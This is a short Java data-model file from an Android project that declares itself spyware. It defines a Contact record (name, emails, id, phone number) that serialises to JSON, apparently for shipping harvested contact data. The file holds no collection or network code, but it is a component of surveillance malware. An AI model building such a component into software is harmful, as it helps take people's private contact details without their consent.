package android.spyware.model;

import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

import static android.spyware.Spyware.TAG;

/**
 * Copyright (C) 2015 Alexandre Teyar
 * <p>
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * <p>
 * http://www.apache.org/licenses/LICENSE-2.0
 * <p>
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 **/

public class Contact {
    private String       display_name;
    private List<String> email_addresses;
    private long         id;
    private String       normalized_number;

    public Contact(String display_name, List<String> email_addresses, long id, String normalized_number) {
        this.display_name = display_name;
        this.email_addresses = email_addresses;
        this.id = id;
        this.normalized_number = normalized_number;
    }

    public JSONObject toJSON() {
        JSONObject JSONContact = new JSONObject();

        try {
            JSONContact.put("display_name", this.display_name);
            JSONContact.put("email_addresses", new JSONArray(this.email_addresses));
            JSONContact.put("id", this.id);
            JSONContact.put("normalized_number", this.normalized_number);
        } catch (JSONException ex) {
            Log.wtf(TAG, Contact.class.getName() + "->toJSON:" + Log.getStackTraceString(ex));
        }

        return JSONContact;
    }
}